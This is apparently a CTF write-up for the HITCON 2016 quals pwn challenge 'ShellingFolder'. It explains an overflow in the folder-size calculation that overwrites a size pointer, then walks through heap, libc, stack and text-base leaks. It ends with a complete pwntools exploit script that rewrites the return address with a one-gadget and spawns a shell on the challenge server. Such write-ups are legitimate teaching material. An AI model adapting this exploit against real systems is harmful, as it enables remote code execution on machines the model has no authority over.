---
layout: post
redirect_from:
  - /writeup/ctf/2016/hitcon-ctf-2016-quals-shellingfolder/
  - /blog/2016/10/10/hitcon-ctf-2016-quals-shellingfolder/
date: "2016-10-10T23:04:07+09:00"
tags: [ "ctf", "writeup", "pwn", "heap" ]
---

# HITCON QUALS CTF 2016: ShellingFolder

The binary is an application which emulates a file system.
The structure is like below.

``` c
struct entry_t {
    entry_t *children[10]; // 0x0
    entry_t *parent; // 0x50
    char name[0x20]; // 0x58
    int size; // 0x78
    bool is_directory; // 0x80
}; // 0x88
```

There vulnerability is in the choice `6.Caculate the size of folder`.
This `strlen` the entry's `name` and `memcpy` it to `buf`. This overwrites `size_ptr` and it allows me to write anywhere.

``` asm
(fcn) fcn.calculate_the_size_of_folder
    ; var entry_t *pwd @ rbp-0x38
    ; var char buf[0x18] @ rbp-0x30
    ; var int *size_ptr @ rbp-0x18
    ; var int i @ rbp-0x10
    ; var uint64_t canary @ rbp-0x8
```

To read somewhere, at first I leaks the value of `size_ptr`.
This tells me the address of heap.
Then I do some `malloc` and `free` to put an address of malloc-arena onto the heap.
Then rewrite a `children[i]` to `p - 0x58` (`p` is the address and `0x58` is offset of `name` in `entry_t`) and read it.
Do the same thing about `environ` in libc, and then rewrite return pointer, I could get a shell.

``` python
#!/usr/bin/env python2
import itertools
import random
from pwn import * # https://pypi.python.org/pypi/pwntools
import argparse
parser = argparse.ArgumentParser()
parser.add_argument('host', nargs='?', default='52.69.237.212')
parser.add_argument('port', nargs='?', default=4869, type=int)
args = parser.parse_args()
context.log_level = 'debug'

entry_children = 0
entry_parent = 0x50
entry_name = 0x58
entry_size = 0x78
entry_is_directory = 0x80

p = remote(args.host, args.port)

def your_choice(n):
    p.recvuntil('Your choice:')
    p.sendline(str(n))

def list_the_current_folder():
    your_choice(1)
    assert p.recvline().strip() == '----------------------'
    acc = []
    while True:
        s = p.recvline(keepends=False)
        if s == '----------------------':
            break
        acc += [ s ]
    return acc
def change_the_current_folder(s):
    your_choice(2)
    p.recvuntil('Choose a Folder :')
    p.sendline(s)
def make_a_folder(s):
    your_choice(3)
    p.recvuntil('Name of Folder:')
    p.sendline(s)
def create_a_file_in_current_folder(s, n):
    your_choice(4)
    p.recvuntil('Name of File:')
    p.send((s + '\n')[: 0x1f])
    p.recvuntil('Size of File:')
    p.sendline(str(n))
def remove_a_folder_or_a_file(s):
    your_choice(5)
    p.recvuntil('Choose a Folder or file :')
    p.sendline(s)
def caculate_the_size_of_folder(result=True):
    your_choice(6)
    if not result:
        return
    acc = []
    while True:
        s = p.recvline()
        if s.startswith('The size of the folder is '):
            size = (s.split()[-1])
            break
        else:
            name, size = s.split(' : size ')
            acc += [ ( name, int(size) ) ]
    return ( acc, int(size) )
def exit():
    your_choice(7)

ls = list_the_current_folder
cd = change_the_current_folder
mkdir = make_a_folder
touch = create_a_file_in_current_folder
rm = remove_a_folder_or_a_file
vuln = caculate_the_size_of_folder

def rm_star():
    for f in ls():
        rm(f)

# leak heap base
mkdir('heap') # 1
cd('heap')
touch('A' * 0x18, 0) # 2
s = vuln()
heap_base = u64(s[0][0][0][0x18 :].ljust(8, '\0')) // 0x1000 * 0x1000
log.info('heap base: %#x', heap_base)
entry = lambda i: heap_base + 0x90 * i + 0x10
cd('..')

# leak libc base
mkdir('libc') # 3
cd('libc')
touch('foo', 0) # 4
touch('A' * 0x18 + p64(entry(3) + 0), u16(p64(entry(4) - entry_name)[0 : 2])) # 5
touch('B' * 0x18 + p64(entry(3) + 2), u16(p64(entry(4) - entry_name)[2 : 4])) # 6
touch('C' * 0x18 + p64(entry(3) + 4), u16(p64(entry(4) - entry_name)[4 : 6])) # 7
touch('D' * 0x18 + p64(entry(3) + 6), u16(p64(entry(4) - entry_name)[6 : 8])) # 8
rm('foo') # delete 4
vuln()
s = ls()
malloc_arena_entry = u64(s[0].ljust(8, '\0'))
libc_base = malloc_arena_entry - 0x3c3b78
log.info('libc base: %#x', libc_base)
cd('..')

# leak stack address
mkdir('stack') # 4
cd('stack')
environ = libc_base + 0x3c5f98
touch('A' * 0x18 + p64(entry(4) + 0x20 + 0), u16(p64(environ - entry_name)[0 : 2])) # 9
touch('B' * 0x18 + p64(entry(4) + 0x20 + 2), u16(p64(environ - entry_name)[2 : 4])) # 10
touch('C' * 0x18 + p64(entry(4) + 0x20 + 4), u16(p64(environ - entry_name)[4 : 6])) # 11
touch('D' * 0x18 + p64(entry(4) + 0x20 + 6), u16(p64(environ - entry_name)[6 : 8])) # 12
vuln()
s = ls()
print(s)
stack = u64(s[-1].ljust(8, '\0'))
log.info('stack: %#x', stack)
ret_ptr = stack - 0x110
log.info('return pointer: %#x', ret_ptr)
cd('..')

# leak text address
mkdir('text') # 13
cd('text')
touch('A' * 0x18 + p64(entry(13) + 0x20 + 0), u16(p64(ret_ptr - entry_name)[0 : 2])) # 14
touch('B' * 0x18 + p64(entry(13) + 0x20 + 2), u16(p64(ret_ptr - entry_name)[2 : 4])) # 15
touch('C' * 0x18 + p64(entry(13) + 0x20 + 4), u16(p64(ret_ptr - entry_name)[4 : 6])) # 16
touch('D' * 0x18 + p64(entry(13) + 0x20 + 6), u16(p64(ret_ptr - entry_name)[6 : 8])) # 17
vuln()
s = ls()
text_base = u64(s[-1][len('\x1b[32m') : - len('\x1b[0m')].ljust(8, '\0')) - 0x1602
log.info('text base: %#x', text_base)
cd('..')

# attack
one_shot_rce = libc_base + 0xef9f4
original_value = text_base + 0x1669
stack_garbage = text_base + 0xaa0
mkdir('attack') # 18
cd('attack')
touch('A' * 0x18 + p64(ret_ptr + 0), u16(p64(one_shot_rce - original_value)[0 : 2])) # 19
touch('B' * 0x18 + p64(ret_ptr + 2), u16(p64(one_shot_rce - original_value)[2 : 4])) # 20
touch('C' * 0x18 + p64(ret_ptr + 4), u16(p64(one_shot_rce - original_value)[4 : 6])) # 21
touch('D' * 0x18 + p64(ret_ptr + 6), u16(p64(one_shot_rce - original_value)[6 : 8])) # 22
touch('E' * 0x18 + p64(ret_ptr + 0x58 + 0), u16(p64(2**64 - stack_garbage)[0 : 2])) # 23
touch('F' * 0x18 + p64(ret_ptr + 0x58 + 2), u16(p64(2**64 - stack_garbage)[2 : 4])) # 24
touch('G' * 0x18 + p64(ret_ptr + 0x58 + 4), u16(p64(2**64 - stack_garbage)[4 : 6])) # 25
touch('H' * 0x18 + p64(ret_ptr + 0x58 + 6), u16(p64(2**64 - stack_garbage)[6 : 8])) # 26
vuln()

time.sleep(1)
p.sendline('id')
p.interactive()
```
